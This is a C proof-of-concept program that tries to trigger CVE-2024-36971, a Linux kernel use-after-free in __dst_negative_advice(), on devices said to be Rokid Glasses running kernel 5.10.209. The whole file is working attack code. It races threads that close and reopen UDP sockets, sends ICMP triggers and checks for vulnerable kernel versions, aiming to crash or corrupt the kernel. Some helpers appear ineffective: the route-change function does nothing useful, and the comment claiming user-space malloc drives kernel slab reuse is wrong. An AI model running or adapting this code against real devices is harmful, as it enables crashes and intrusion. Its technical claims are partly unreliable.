/*
 * CVE-2024-36971 Proof of Concept Trigger
 * ----------------------------------------
 * Linux Kernel UAF in __dst_negative_advice()
 *
 * This PoC attempts to trigger the vulnerability by:
 * 1. Creating multiple UDP sockets
 * 2. Establishing routing cache entries
 * 3. Triggering negative advice through network events
 * 4. Racing to access freed dst_entry structures
 *
 * Target: Rokid Glasses - Linux Kernel 5.10.209
 *
 * Compile: aarch64-linux-gnu-gcc -static -pthread -o cve_2024_36971_poc cve_2024_36971_poc.c
 *
 * WARNING: This may cause kernel panic or data corruption!
 * Use only on test devices you own and can restore.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <sched.h>

// Configuration
#define NUM_SOCKETS 64
#define NUM_THREADS 4
#define TRIGGER_ITERATIONS 10000
#define TARGET_PORT_BASE 40000

// Global state
volatile int g_running = 1;
volatile int g_trigger_count = 0;
int g_sockets[NUM_SOCKETS];
pthread_mutex_t g_lock = PTHREAD_MUTEX_INITIALIZER;

// Signal handler
void signal_handler(int sig)
{
    printf("\n[!] Caught signal %d, stopping...\n", sig);
    g_running = 0;
}

// Print hex dump
void hexdump(const char *desc, void *addr, int len)
{
    int i;
    unsigned char *pc = (unsigned char *)addr;
    if (desc != NULL)
        printf("%s:\n", desc);
    for (i = 0; i < len; i++)
    {
        if ((i % 16) == 0)
        {
            if (i != 0)
                printf("\n");
            printf("  %04x ", i);
        }
        printf(" %02x", pc[i]);
    }
    printf("\n");
}

// Get current timestamp in microseconds
unsigned long get_timestamp_us(void)
{
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return tv.tv_sec * 1000000UL + tv.tv_usec;
}

// Create and setup UDP socket
int create_udp_socket(int index)
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        perror("socket");
        return -1;
    }

    // Set socket options for aggressive behavior
    int val = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));

    // Set non-blocking for racing
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    return sock;
}

// Connect socket to establish dst_cache
int connect_socket(int sock, int index)
{
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    // Use different ports to create different routes
    addr.sin_port = htons(TARGET_PORT_BASE + index);
    // Use an address that will likely fail/timeout (example: documentation range)
    // 192.0.2.x is TEST-NET-1 (RFC 5737)
    addr.sin_addr.s_addr = inet_addr("192.0.2.1");

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
        if (errno != EINPROGRESS)
        {
            perror("connect");
            return -1;
        }
    }
    return 0;
}

// Send data to trigger routing
int send_data(int sock)
{
    char buf[64] = "TRIGGER";
    int ret = send(sock, buf, sizeof(buf), MSG_DONTWAIT);
    return ret;
}

// Thread function: continuously send data to trigger negative_advice
void *sender_thread(void *arg)
{
    int thread_id = (int)(long)arg;
    int start_idx = (thread_id * NUM_SOCKETS) / NUM_THREADS;
    int end_idx = ((thread_id + 1) * NUM_SOCKETS) / NUM_THREADS;
    char buf[128];
    int i;

    printf("[Thread %d] Started, handling sockets %d-%d\n", thread_id, start_idx, end_idx - 1);

    while (g_running)
    {
        for (i = start_idx; i < end_idx && g_running; i++)
        {
            if (g_sockets[i] > 0)
            {
                // Send data to trigger routing decisions
                send_data(g_sockets[i]);

                // Small delay to create race window
                usleep(1);
            }
        }

        pthread_mutex_lock(&g_lock);
        g_trigger_count++;
        pthread_mutex_unlock(&g_lock);
    }

    printf("[Thread %d] Exiting\n", thread_id);
    return NULL;
}

// Thread function: rapidly close and reopen sockets
void *churner_thread(void *arg)
{
    int thread_id = (int)(long)arg;
    int idx;

    printf("[Churner %d] Started\n", thread_id);

    while (g_running)
    {
        // Pick random socket
        idx = rand() % NUM_SOCKETS;

        pthread_mutex_lock(&g_lock);
        if (g_sockets[idx] > 0)
        {
            // Close socket (this may trigger dst_release)
            close(g_sockets[idx]);
            g_sockets[idx] = -1;
        }
        pthread_mutex_unlock(&g_lock);

        // Tiny delay
        usleep(10);

        // Recreate socket
        pthread_mutex_lock(&g_lock);
        if (g_sockets[idx] <= 0)
        {
            g_sockets[idx] = create_udp_socket(idx);
            if (g_sockets[idx] > 0)
            {
                connect_socket(g_sockets[idx], idx);
            }
        }
        pthread_mutex_unlock(&g_lock);

        usleep(100);
    }

    printf("[Churner %d] Exiting\n", thread_id);
    return NULL;
}

// Try to trigger ICMP unreachable by sending to closed port
void trigger_icmp_unreachable(void)
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
        return;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(1); // Low port, likely to be closed
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");

    char buf[64] = "ICMP_TRIGGER";
    sendto(sock, buf, sizeof(buf), 0, (struct sockaddr *)&addr, sizeof(addr));
    close(sock);
}

// Netlink route manipulation to trigger negative_advice
int trigger_route_change(void)
{
    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (sock < 0)
    {
        // Might fail without CAP_NET_ADMIN
        return -1;
    }

    struct sockaddr_nl addr;
    memset(&addr, 0, sizeof(addr));
    addr.nl_family = AF_NETLINK;
    addr.nl_groups = RTMGRP_IPV4_ROUTE;

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
        close(sock);
        return -1;
    }

    close(sock);
    return 0;
}

// Memory pressure to encourage slab reuse
void apply_memory_pressure(void)
{
    // Allocate and free memory to encourage kernel slab reuse
    void *ptrs[100];
    int i;

    for (i = 0; i < 100; i++)
    {
        ptrs[i] = malloc(4096);
        if (ptrs[i])
            memset(ptrs[i], 'A', 4096);
    }

    for (i = 0; i < 100; i++)
    {
        if (ptrs[i])
            free(ptrs[i]);
    }
}

// Main trigger function
void run_trigger(void)
{
    pthread_t threads[NUM_THREADS];
    pthread_t churners[2];
    int i;
    unsigned long start_time, elapsed;

    printf("[*] Setting up %d UDP sockets...\n", NUM_SOCKETS);

    // Create all sockets
    for (i = 0; i < NUM_SOCKETS; i++)
    {
        g_sockets[i] = create_udp_socket(i);
        if (g_sockets[i] < 0)
        {
            printf("[-] Failed to create socket %d\n", i);
        }
        else
        {
            connect_socket(g_sockets[i], i);
        }
    }

    printf("[*] Starting %d sender threads...\n", NUM_THREADS);

    // Start sender threads
    for (i = 0; i < NUM_THREADS; i++)
    {
        pthread_create(&threads[i], NULL, sender_thread, (void *)(long)i);
    }

    // Start churner threads (close/reopen sockets rapidly)
    printf("[*] Starting churner threads...\n");
    for (i = 0; i < 2; i++)
    {
        pthread_create(&churners[i], NULL, churner_thread, (void *)(long)i);
    }

    start_time = get_timestamp_us();

    printf("[*] Running trigger loop...\n");
    printf("[*] Watching for kernel panic/oops...\n");
    printf("[*] Press Ctrl+C to stop\n\n");

    int last_count = 0;
    while (g_running)
    {
        sleep(1);

        elapsed = (get_timestamp_us() - start_time) / 1000000;

        pthread_mutex_lock(&g_lock);
        int current_count = g_trigger_count;
        pthread_mutex_unlock(&g_lock);

        int rate = current_count - last_count;
        last_count = current_count;

        printf("[+] Elapsed: %lu sec | Triggers: %d | Rate: %d/sec\n",
               elapsed, current_count, rate);

        // Apply memory pressure periodically
        apply_memory_pressure();

        // Try to trigger ICMP responses
        trigger_icmp_unreachable();
    }

    printf("\n[*] Stopping threads...\n");

    // Wait for threads
    for (i = 0; i < NUM_THREADS; i++)
    {
        pthread_join(threads[i], NULL);
    }
    for (i = 0; i < 2; i++)
    {
        pthread_join(churners[i], NULL);
    }

    printf("[*] Cleaning up sockets...\n");
    for (i = 0; i < NUM_SOCKETS; i++)
    {
        if (g_sockets[i] > 0)
        {
            close(g_sockets[i]);
        }
    }

    printf("[*] Done. Total triggers: %d\n", g_trigger_count);
}

// Check if kernel version is vulnerable
int check_kernel_version(void)
{
    FILE *fp = fopen("/proc/version", "r");
    if (!fp)
        return -1;

    char buf[256];
    if (fgets(buf, sizeof(buf), fp))
    {
        printf("[*] Kernel: %s", buf);

        // Parse version
        int major, minor, patch;
        if (sscanf(buf, "Linux version %d.%d.%d", &major, &minor, &patch) == 3)
        {
            printf("[*] Parsed: %d.%d.%d\n", major, minor, patch);

            // Check if vulnerable (5.5 <= version < 5.10.219)
            if (major == 5 && minor == 10 && patch < 219)
            {
                printf("[+] Kernel version is VULNERABLE to CVE-2024-36971!\n");
                fclose(fp);
                return 1;
            }
            else if (major == 5 && minor >= 5 && minor < 10)
            {
                printf("[+] Kernel version may be VULNERABLE to CVE-2024-36971!\n");
                fclose(fp);
                return 1;
            }
        }
    }

    fclose(fp);
    printf("[-] Kernel version appears patched or not affected\n");
    return 0;
}

int main(int argc, char **argv)
{
    printf("==========================================\n");
    printf("  CVE-2024-36971 PoC Trigger\n");
    printf("  __dst_negative_advice() UAF\n");
    printf("==========================================\n\n");

    // Check if running as root
    if (getuid() != 0)
    {
        printf("[!] Warning: Not running as root. Some operations may fail.\n\n");
    }

    // Check kernel version
    if (!check_kernel_version())
    {
        printf("\n[!] Kernel may not be vulnerable. Continue anyway? [y/N] ");
        char c = getchar();
        if (c != 'y' && c != 'Y')
        {
            printf("[-] Aborted.\n");
            return 1;
        }
    }

    // Setup signal handler
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    printf("\n[!] WARNING: This may crash the device!\n");
    printf("[!] Press Ctrl+C to stop at any time.\n");
    printf("[*] Starting in 3 seconds...\n");
    sleep(3);

    run_trigger();

    printf("\n[*] If you reached here without kernel panic, the trigger may need refinement.\n");
    printf("[*] Check dmesg for any kernel warnings/errors.\n");

    return 0;
}
